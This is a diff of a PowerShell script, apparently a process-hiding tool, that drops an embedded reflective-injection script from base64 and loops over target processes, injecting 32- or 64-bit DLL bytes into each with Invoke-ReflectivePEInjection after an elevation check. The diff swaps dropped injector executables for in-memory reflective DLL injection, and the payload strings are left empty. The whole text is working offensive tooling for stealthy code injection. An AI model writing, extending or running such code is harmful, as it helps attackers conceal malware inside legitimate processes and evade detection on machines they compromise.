@@ -1,10 +1,20 @@
 ﻿param([string[]] $n=@(),[int[]] $i=@(),[string[]] $x=@())
 $x64PayStringBase64=""
 $x86PayStringBase64=""
-$Injector32Base64=""
-$Injector64Base64=""
-$Injector32Path=$PSScriptRoot+"\x86Inj.exe"
-$Injector64Path=$PSScriptRoot+"\x64Inj.exe"
+#$Injector32Base64=""
+#$Injector64Base64=""
+#$Injector32Path=$PSScriptRoot+"\x86Inj.exe"
+#$Injector64Path=$PSScriptRoot+"\x64Inj.exe"
+$InvokeStringBase64=""
+$ReflectivePEScript=$PSScriptRoot+'\ReflectiveDLLInj.ps1'
+function write-fromBase64
+{
+param([string] $base64,[string]$filePath)
+New-Item -Path $filePath -ItemType file -Force >$null
+$bytesArr=[Convert]::FromBase64String($base64)
+[io.file]::WriteAllBytes($filePath,$bytesArr)
+}
+
 function writeFiles
 {
     param([string[]] $n=@(),[int[]] $i=@())
@@ -13,12 +23,10 @@ function writeFiles
     New-Item -Path $infoTransfetPath -ItemType file -Force >$null
     [string]$i|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
     [string]$n|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
-    New-Item -Path $Injector32Path -ItemType file -Force >$null
-    New-Item -Path $Injector64Path -ItemType file -Force >$null
-    $Inj32Bytes=[Convert]::FromBase64String($Injector32Base64)
-    [io.file]::WriteAllBytes($Injector32Path,$Inj32Bytes)
-    $Inj64Bytes=[Convert]::FromBase64String($Injector64Base64)
-    [io.file]::WriteAllBytes($Injector64Path,$Inj64Bytes)
+    #write-fromBase64 -base64 $Injector32Base64 -filePath $Injector32Path
+    #write-fromBase64 -base64 $Injector64Base64 -filePath $Injector64Path
+    #New-Item -Path $Injector64Path -ItemType file -Force >$null
+    write-fromBase64  -base $InvokeStringBase64 -filePath $ReflectivePEScript
 }
 
 function isElevated
@@ -100,13 +108,13 @@ function procHiderDaemon
                         if(Get-Process -Id $proc.ID -ErrorAction Ignore)
                             {
                             Write-Host $proc.Name is alive! pID =  $proc.ID
-                            #Write-Host "$($proc.Name) is x$(if(is64bit($proc)) {'64'} else {'86'})"
                             . $ReflectivePEScript
                             try
                             {
                             Invoke-ReflectivePEInjection -PEBytes $(if(is64bit($proc)){$x64DDLBytes}else{$x86DDLBytes}) -ProcId $proc.ID
                             }
                             catch{}
+
                             Write-Host Finished Injection to $proc.Name
 
 
